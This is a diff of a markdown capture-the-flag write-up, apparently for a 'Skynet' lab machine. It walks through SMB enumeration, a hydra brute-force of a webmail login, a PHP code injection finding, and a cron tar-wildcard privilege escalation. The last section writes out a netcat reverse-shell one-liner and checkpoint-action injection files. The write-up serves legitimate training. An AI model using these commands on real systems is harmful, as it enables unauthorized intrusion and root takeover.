@@ -1,7 +1,8 @@
 ## 1. Recon 
 NMAP Scan Results:
 
-```# Nmap 7.80 scan initiated Fri Apr  9 10:56:36 2021 as: nmap -sV -vv -oN nmap.nmap 10.10.31.111
+```
+# Nmap 7.80 scan initiated Fri Apr  9 10:56:36 2021 as: nmap -sV -vv -oN nmap.nmap 10.10.31.111
 Nmap scan report for ip-10-10-31-111.eu-west-1.compute.internal (10.10.31.111)
 Host is up, received arp-response (0.00095s latency).
 Scanned at 2021-04-09 10:56:38 UTC for 11s
@@ -25,7 +26,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ## Gobuster Scan Results:
 
-```gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.31.111 -x html -e -t 150
+`gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.31.111 -x html -e -t 150`
+
+```
 
 ===============================================================
 Gobuster v3.0.1
@@ -56,7 +59,8 @@ http://10.10.31.111/squirrelmail (Status: 301)
 
 ## SMB lookup
 
-```smbmap -H 10.10.125.149               
+```
+smbmap -H 10.10.125.149               
 [+] Guest session       IP: 10.10.125.149:445   Name: 10.10.125.149                                     
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
@@ -72,12 +76,14 @@ Connect to SMB anonymous
 
 Look for files in the anonymous share
 
-```cat attention.txt                                      
+```
+cat attention.txt                                      
 A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
 -Miles Dyson
 ```
 
-```cat log1.txt     
+```
+cat log1.txt     
 terminator22596
 terminator219
 terminator20
@@ -117,7 +123,8 @@ The gobuster dir scan have find the directory `squirrelmail` which contains the 
 
 ## Lets crack the password using hydra
 
-```hydra -l milesdyson -P log1.txt 10.10.22.141 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."
+```
+hydra -l milesdyson -P log1.txt 10.10.22.141 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-10 17:49:16
@@ -136,7 +143,8 @@ Let get to the smb share of milesdyson.
 Look for phishy files.
 In the notes directory there is file named important.txt.
 
-```cat important.txt 
+```
+cat important.txt 
 
 1. Add features to beta CMS /45kra24zxs28v3yd
 2. Work on T-800 Model 101 blueprints
@@ -148,7 +156,8 @@ Lets have a look at it.
 
 ### Let's gobuster to find sub dir in /45kra24zxs28v3yd
 
-```obuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.22.141/45kra24zxs28v3yd/ -e -x html -t 150
+```
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.22.141/45kra24zxs28v3yd/ -e -x html -t 150
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
@@ -179,6 +188,7 @@ Use searchsploit to find the vulnerability.
  It have PHP code injection.
  
  ```
+ 
   ,--^----------,--------,-----,-------^--,
   | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
   `+---------------------------^----------|
@@ -196,7 +206,8 @@ VULNERABILITY: PHP CODE INJECTION
 ####################################
 ```
 
-```#####################################################
+```
+#####################################################
 DESCRIPTION
 #####################################################
 
@@ -238,7 +249,8 @@ Got the user flag???
 `cat /etc/crontab` 
 Look for cron jobs.
 
-```cat /etc/crontab
+```
+cat /etc/crontab
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
 # command to install the new version when you edit this file
@@ -259,7 +271,8 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 It is clear that backup.sh is called every minute.
 [Wild Card in Linux](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/) clearly explains this vulnerability.
 
-```cd /var/www/html
+```
+cd /var/www/html
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip> 1234 >/tmp/f" > shell.sh
 touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
 touch "/var/www/html/--checkpoint=1"
@@ -268,7 +281,8 @@ touch "/var/www/html/--checkpoint=1"
 Start netcat to listener.
  Wait for script to run the command after which remote shell is gained with root privileges
  
- ```nc -nvlp 5555                                                                                              1 ⨯
+ ```
+ nc -nvlp 5555                                                                                              1 ⨯
 Ncat: Version 7.91 ( https://nmap.org/ncat )
 Ncat: Listening on :::5555
 Ncat: Listening on 0.0.0.0:5555
